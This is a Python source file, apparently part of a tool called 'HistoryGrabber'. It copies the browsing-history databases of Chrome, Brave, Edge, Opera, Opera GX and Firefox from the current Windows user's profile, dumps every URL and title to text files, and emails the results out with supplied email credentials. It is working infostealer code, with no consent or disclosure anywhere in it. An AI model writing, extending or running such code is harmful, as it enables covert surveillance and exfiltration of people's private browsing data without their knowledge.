import os
import sqlite3
import shutil
from HistoryGrabber.functions import send_email

def get_history(uname, browser, path):
    """
    Retrieves and formats the browsing history from the specified browser.

    Args:
        uname (str): Username of the system user.
        browser (str): Name of the browser.
        path (str): Path to the browser's history file.

    Returns:
        str: Formatted browsing history.
    """
    path_file = os.path.normpath(path)
    shutil.copy2(path_file, "Historyvault.db")
    con = sqlite3.connect("Historyvault.db")
    cursor = con.cursor()
    cursor.execute("SELECT url, title FROM urls" if browser != "firefox" else "SELECT url, title FROM moz_places")
    url = "\n".join([f"url: {link}\ntitle: {title}\n{'='*50}" for link, title in cursor.fetchall()])
    cursor.close()
    con.close()
    os.remove("Historyvault.db")
    return url

def save_history_to_file(uname, browser, history):
    """
    Saves the browsing history to a file.

    Args:
        uname (str): Username of the system user.
        browser (str): Name of the browser.
        history (str): Formatted browsing history.

    Returns:
        None
    """
    file_path = os.path.join(os.getcwd(), f"{uname}_{browser}.txt")
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(history)

def main(email, password):
    """
    Main function to retrieve and save browsing history for multiple browsers,
    and send the history via email.

    Args:
        email (str): Email address to send the history to.
        password (str): Password for the email account.

    Returns:
        None
    """
    uname = os.getlogin()

    # Dictionary containing browser names and their respective history file paths
    browsers = {
        "chrome": rf"C:\Users\{uname}\AppData\Local\Google\Chrome\User Data\Default\History",
        "brave": rf"C:\Users\{uname}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History",
        "edge": rf"C:\Users\{uname}\AppData\Local\Microsoft\Edge\User Data\Default\History",
        "opera_gx": rf"C:\Users\{uname}\AppData\Roaming\Opera Software\Opera GX Stable\History",
        "opera": rf"C:\Users\{uname}\AppData\Roaming\Opera Software\Opera Stable\History",
        "firefox": rf"C:\Users\{uname}\AppData\Roaming\Mozilla\Firefox\Profiles"
    }

    # Loop through each browser and retrieve/save history
    for browser, path in browsers.items():
        try:
            if browser == "firefox":
                for profile in os.listdir(path):
                    if "default-release" in profile:
                        history = get_history(uname, browser, os.path.join(path, profile, "places.sqlite"))
                        save_history_to_file(uname, browser, history)
            else:
                history = get_history(uname, browser, path)
                save_history_to_file(uname, browser, history)
        except Exception as e:
            print(f"[ERROR] {e}")

    # Send the collected history via email
    try:
        send_email(uname=uname, email=email, password=password)
    except Exception as e:
        print(f"[ERROR] {e}")

if __name__ == '__main__':
    pass